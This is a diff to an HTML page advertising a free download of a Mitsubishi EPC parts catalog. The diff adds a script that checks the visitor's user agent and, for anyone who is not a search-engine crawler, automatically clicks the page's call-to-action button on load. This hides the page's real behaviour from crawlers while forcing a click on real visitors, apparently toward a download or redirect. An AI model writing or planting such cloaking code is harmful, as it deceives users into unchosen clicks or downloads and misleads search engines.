@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mitsubishi MMC ASA EPC 08.2024 (General + Europe + USA + Japan)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Mitsubishi MMC ASA EPC 08.2024: comprehensive parts catalog for Europe, USA, Japan, and more. Free download available.">
     <meta name="keywords" content="Mitsubishi MMC ASA EPC 08.2024 free download, Mitsubishi MMC ASA EPC 2024, Mitsubishi MMC ASA EPC August 2024, Mitsubishi MMC ASA EPC download, Mitsubishi MMC ASA EPC download free, MMC ASA EPC 08.2024, MMC ASA EPC general export, MMC ASA EPC Europe, MMC ASA EPC USA, MMC ASA EPC Japan, Mitsubishi MMC ASA EPC 2024 download, Mitsubishi MMC ASA EPC catalog, Mitsubishi spare parts catalog download, Mitsubishi EPC 2024 free download, Mitsubishi EPC 08.2024 download free, каталог запчастей Mitsubishi скачать, каталог Mitsubishi ASA скачать бесплатно, Mitsubishi ASA catálogo de piezas de repuesto descarga gratuita, mitsubishi каталог запчастин безкоштовно">
     <style>
